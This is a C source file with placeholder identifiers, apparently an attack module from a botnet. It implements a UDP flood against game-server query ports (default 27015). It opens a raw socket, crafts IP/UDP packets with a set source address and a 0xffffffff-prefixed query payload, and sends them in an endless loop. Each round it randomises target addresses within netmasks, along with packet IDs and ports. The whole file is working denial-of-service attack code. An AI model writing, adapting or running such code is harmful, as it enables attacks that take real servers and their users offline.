
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
typedef int uint16_t ;
struct udphdr {void* dest; void* len; scalar_t__ check; void* source; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; int daddr; int saddr; int protocol; void* frag_off; void* tot_len; } ;
struct TYPE_2__ {void* sin_port; } ;
struct attack_target {int netmask; TYPE_1__ sock_addr; int addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 scalar_t__ VAR_15 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 void* FUNC_1 (int,int) ;
 scalar_t__ FUNC_2 (int*,int) ;
 scalar_t__ FUNC_3 (struct iphdr*,struct udphdr*,void*,int) ;
 int FUNC_4 (int) ;
 scalar_t__ VAR_16 ;
 int FUNC_5 (scalar_t__) ;
 void* FUNC_6 (int) ;
 scalar_t__ FUNC_7 (int ) ;
 int FUNC_8 (char*,...) ;
 void* FUNC_9 () ;
 int FUNC_10 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_11 (int,int ,int ,int*,int) ;
 int FUNC_12 (int ,int ,int ) ;
 char* FUNC_13 (int ,int*) ;
 int FUNC_14 (int ) ;
 int FUNC_15 (char*,char*,int) ;

void FUNC_16(uint8_t VAR_17, struct attack_target *VAR_18, uint8_t VAR_19, struct attack_option *VAR_20)
{
    int VAR_21, VAR_22;
    char **VAR_23 = FUNC_1(VAR_17, sizeof (char *));
    uint8_t VAR_24 = FUNC_0(VAR_19, VAR_20, VAR_4, 0);
    uint16_t VAR_25 = FUNC_0(VAR_19, VAR_20, VAR_3, 0xffff);
    uint8_t VAR_26 = FUNC_0(VAR_19, VAR_20, VAR_5, 64);
    BOOL VAR_27 = FUNC_0(VAR_19, VAR_20, VAR_2, VAR_7);
    port_t VAR_28 = FUNC_0(VAR_19, VAR_20, VAR_6, 0xffff);
    port_t VAR_29 = FUNC_0(VAR_19, VAR_20, VAR_1, 27015);
    char *VAR_30;
    int VAR_31;

    FUNC_14(VAR_14);
    VAR_30 = FUNC_13(VAR_14, &VAR_31);

    if ((VAR_22 = FUNC_12(VAR_0, VAR_13, VAR_9)) == -1)
    {



        return;
    }
    VAR_21 = 1;
    if (FUNC_11(VAR_22, VAR_8, VAR_10, &VAR_21, sizeof (int)) == -1)
    {



        FUNC_4(VAR_22);
        return;
    }

    for (VAR_21 = 0; VAR_21 < VAR_17; VAR_21++)
    {
        struct iphdr *VAR_32;
        struct udphdr *VAR_33;
        char *VAR_34;

        VAR_23[VAR_21] = FUNC_1(128, sizeof (char));
        VAR_32 = (struct iphdr *)VAR_23[VAR_21];
        VAR_33 = (struct udphdr *)(VAR_32 + 1);
        VAR_34 = (char *)(VAR_33 + 1);

        VAR_32->version = 4;
        VAR_32->ihl = 5;
        VAR_32->tos = VAR_24;
        VAR_32->tot_len = FUNC_6(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + VAR_31);
        VAR_32->id = FUNC_6(VAR_25);
        VAR_32->ttl = VAR_26;
        if (VAR_27)
            VAR_32->frag_off = FUNC_6(1 << 14);
        VAR_32->protocol = VAR_9;
        VAR_32->saddr = VAR_11;
        VAR_32->daddr = VAR_18[VAR_21].addr;

        VAR_33->source = FUNC_6(VAR_28);
        VAR_33->dest = FUNC_6(VAR_29);
        VAR_33->len = FUNC_6(sizeof (struct udphdr) + 4 + VAR_31);

        *((uint32_t *)VAR_34) = 0xffffffff;
        VAR_34 += sizeof (uint32_t);
        FUNC_15(VAR_34, VAR_30, VAR_31);
    }

    while (VAR_15)
    {
        for (VAR_21 = 0; VAR_21 < VAR_17; VAR_21++)
        {
            char *VAR_35 = VAR_23[VAR_21];
            struct iphdr *VAR_36 = (struct iphdr *)VAR_35;
            struct udphdr *VAR_37 = (struct udphdr *)(VAR_36 + 1);


            if (VAR_18[VAR_21].netmask < 32)
                VAR_36->daddr = FUNC_5(FUNC_7(VAR_18[VAR_21].addr) + (((uint32_t)FUNC_9()) >> VAR_18[VAR_21].netmask));

            if (VAR_25 == 0xffff)
                VAR_36->id = (uint16_t)FUNC_9();
            if (VAR_28 == 0xffff)
                VAR_37->source = FUNC_9();
            if (VAR_29 == 0xffff)
                VAR_37->dest = FUNC_9();

            VAR_36->check = 0;
            VAR_36->check = FUNC_2((uint16_t *)VAR_36, sizeof (struct iphdr));

            VAR_37->check = 0;
            VAR_37->check = FUNC_3(VAR_36, VAR_37, VAR_37->len, sizeof (struct udphdr) + sizeof (uint32_t) + VAR_31);

            VAR_18[VAR_21].sock_addr.sin_port = VAR_37->dest;
            FUNC_10(VAR_22, VAR_35, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + VAR_31, VAR_12, (struct sockaddr *)&VAR_18[VAR_21].sock_addr, sizeof (struct sockaddr_in));
        }





    }
}
